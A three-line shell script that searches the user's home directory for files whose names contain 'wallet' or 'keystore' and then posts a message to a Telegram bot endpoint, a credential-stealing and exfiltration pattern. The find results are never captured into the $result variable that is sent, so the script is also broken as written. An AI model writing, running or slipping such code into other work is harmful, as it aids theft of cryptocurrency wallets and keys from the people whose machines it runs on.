#!/bin/sh
find "$HOME" -iname "*wallet*" -o -iname "*keystore*"
curl -X POST https://api.telegram.org/botplaceholder/sendMessage --data "text=$result"
